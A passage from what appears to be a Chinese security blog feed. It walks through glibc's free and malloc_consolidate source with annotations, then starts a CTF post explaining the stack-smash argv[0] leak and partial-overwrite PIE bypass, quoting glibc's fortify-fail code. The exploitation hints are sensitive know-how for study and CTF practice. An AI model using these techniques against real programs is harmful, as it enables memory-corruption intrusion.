class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">// 再次确保p不是mmap的堆块指针</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="comment">// 单线程无需获得锁</span></span><br><span class="line">    <span class="comment">/* If we&#x27;re single-threaded, don&#x27;t lock the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 没锁的话，尝试获得锁</span></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="comment">// 如果我们释放的堆块是topchunk，非法</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="comment">// 如果我们释放的堆块超出了arena的边界，非法</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="comment">// 如果我们释放的堆块在与之物理相邻的堆块的PREV_INUSE位上标注为0(即我们释放的堆块未在被使用的状态)，非法</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line">   </span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// 与上面fastbins的检查是一致的</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line">    <span class="comment">// 清空待释放的堆的数据段(tcache不会清空，所以UAF时，可以借助这个特性)</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">// 尝试先与低地址的堆块合并</span></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      <span class="comment">// 将指针指向前一个堆块头</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">// 从对应的bin中取下前一个堆块</span></span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断高地址的堆块是否是topchunk</span></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      <span class="comment">// 查看高地址的堆块是否在使用</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  <span class="comment">// 高地址堆块如果是空闲的，那么取下高地址的堆块</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 如果高地址堆块正在被使用，那么清空其PREV_INUSE标志位</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="comment">// 准备将合并后的堆块放入unsortedbins</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="comment">// 检查unsortedbins是否有异常</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      <span class="comment">// 将堆块插入unsortedbins</span></span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="comment">// 判断插入的堆块是否是属于smallbins</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line">      <span class="comment">// 设置标志位</span></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 如果欲释放的堆块高地址堆块为topchunk，那么将堆块合并入topchunk</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 如果释放的堆块特别大，达到甚至超过了FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line">    <span class="comment">// 那么执行malloc_consolidate函数，合并fastbins</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123; <span class="comment">// 如果是主分配区</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM <span class="comment">// 这个宏没有被define</span></span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=   <span class="comment">// 如果大于阀值，调用systrim向系统返还内存</span></span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果不是主分配区</span></span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p); <span class="comment">// 如果是mmap分配的，调用munmap</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><p>最后讲讲经常提到的<code>malloc_consolidate</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 循环取出fastbins中每一个bin中的堆块</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line">nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">size = chunksize (p);</span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">  <span class="comment">// 尝试合并堆块，前面已经讲过，不再赘述</span></span><br><span class="line">  <span class="comment">// 注意这里没有调用free_perturb函数将fastbins中的数据清空</span></span><br><span class="line">  <span class="comment">// 这是与普通的free不同的地方</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>partial overwrite &amp;&amp; stack smash</title>
      <link href="partial-write.html"/>
      <url>partial-write.html</url>
      
        <content type="html"><![CDATA[<p>继续踩partial overwrite和stack smash的坑</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Stack-Smash"><a href="#Stack-Smash" class="headerlink" title="Stack Smash"></a>Stack Smash</h2><p> 在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串,故而我们可以通过覆盖argv[0]的内容来泄露内存中的字符串</p><h2 id="Partial-Overwrite"><a href="#Partial-Overwrite" class="headerlink" title="Partial Overwrite"></a>Partial Overwrite</h2><p> 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p><p> 这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Ubuntu 18.04</li><li>glibc 2.27</li></ul><h1 id="Stack-Smash-1"><a href="#Stack-Smash-1" class="headerlink" title="Stack Smash"></a>Stack Smash</h1><p>这里以2015 年 32C3 CTF readme为例</p><p>在ctf-wiki上给出的exp以及讲解已经很详细了 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a> ，我这里主要记录一下坑点</p><p>在我复现exp时，发现无论如何，打印出的信息都是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;*** stack smashing detected ***: &lt;unknown&gt; terminated\n&#39;</span><br></pre></td></tr></table></figure><p>一开始我以为是我的操作错误，但是在调试的过程中，却发现貌似与我的操作无关，而是glibc的行为与ctf-wiki上的有所差别</p><p>于是老样子，我去查看了glbc的源代码，发现了<code>__fortify_fail_abort</code>函数是如下的形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail_abort (<span class="built_in">_Bool</span> need_backtrace, <span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don&#x27;t pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren&#x27;t doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">    <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">    msg,</span><br><span class="line">    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">     ? __libc_argv[<span class="number">0</span>] : <span class="string">&quot;&lt;unknown&gt;&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这与ctf-wiki上给出的版本有着很大的区别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到多了一个参数，而且在我调试的过程中，第一个参数永远为0<code>xor edi,edi</code>，所以我们来看看上层函数是如何传参的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">false</span>, <span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在<code>__stack_chk_fail</code>函数中直接就指定了<code>need_backtrace</code>为<code>false</code>，故而无论如何修改<code>argv[0]</code>的指针，都不会输出<code>argv[0]</code>指针指向的字符串，而是会一直输出<code>unknown</code></p><p>另一个坑点在于，如果exp的程序在远端，那么类似如下的报错信息是直接输出在远端的<code>tty</code>上而不是<code>stderr</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;*** stack smashing detected ***: xxxxxx terminated\n&#39;</span><br></pre></td></tr></table></figure><p>与这里有关的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">enum</span> __libc_message_action action, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> FATAL_PREPARE</span></span><br><span class="line">  FATAL_PREPARE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don&#x27;t call __libc_secure_getenv if we aren&#x27;t doing backtrace, which</span></span><br><span class="line"><span class="comment">     may access the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; do_backtrace))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Open a descriptor for /dev/tty unless the user explicitly</span></span><br><span class="line"><span class="comment"> requests errors on standard error.  */</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *on_2 = __libc_secure_getenv (<span class="string">&quot;LIBC_FATAL_STDERR_&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (on_2 == <span class="literal">NULL</span> || *on_2 == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">fd = __open_nocancel (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    fd = 